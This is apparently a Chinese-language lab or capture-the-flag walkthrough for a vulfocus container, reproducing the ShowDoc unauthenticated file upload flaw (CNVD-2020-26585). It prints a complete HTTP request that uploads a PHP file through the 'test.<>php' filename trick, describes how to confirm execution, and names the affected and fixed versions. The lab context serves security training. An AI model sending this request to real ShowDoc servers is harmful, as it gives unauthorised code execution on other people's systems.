# 224｜ShowDoc 前台任意文件上传（CNVD-2020-26585）

- 镜像：`vulfocus/showdoc-CNVD-2020-26585`
- 题库端口：`80,3306`。HTTP 走映射到容器 **80** 的站点；`3306` 是 MySQL，不是上传入口。公开 Vulhub 示例绑在 8080，只换主机端口，路径不变。[S1][S6]

## 一句话打法

未授权 POST `/index.php?s=/home/page/uploadImg`，字段 `editormd-image-file`，文件名写成 `test.<>php` 绕过后缀检查，响应里给出可访问的 PHP 路径。[S1][S2][S3]

## 操作步骤

1. 对映射到 `80` 的 HTTP 发 multipart。公开环境为 ShowDoc **2.8.2**（&lt; 2.8.7 / ≤ 2.8.6）。不必先登录。[S1][S2]

   ```http
   POST /index.php?s=/home/page/uploadImg HTTP/1.1
   Content-Type: multipart/form-data; boundary=----WebKitFormBoundary0RdOKBR8AmAxfRyl

   ------WebKitFormBoundary0RdOKBR8AmAxfRyl
   Content-Disposition: form-data; name="editormd-image-file"; filename="test.<>php"
   Content-Type: text/plain

   <?=phpinfo();?>
   ------WebKitFormBoundary0RdOKBR8AmAxfRyl--
   ```

2. 成功时 JSON/正文返回上传后的 URL（公开示例形如 `/Public/Uploads/<日期>/<id>.php`）。GET 该地址，页面出现 `phpinfo()` 即为上传并解析成功。[S1][S2]

## 本题特有排坑

- 绕过靠文件名里的 **`<>`**（`test.<>php`），不是随便改 `Content-Type`。字段名必须是 `editormd-image-file`。[S1][S2]
- 影响 **ShowDoc &lt; 2.8.7（常见写作 ≤ 2.8.6）**；修到 2.8.7。后来有人把同一问题上报成 CVE-2025-0520，仍是这条 uploadImg 链，不要另找入口。[S1][S4][S5]
- 题库 `3306` 不参与本链。对不上 80 时只换映射端口，路径仍是 `/index.php?s=/home/page/uploadImg`。[S1]
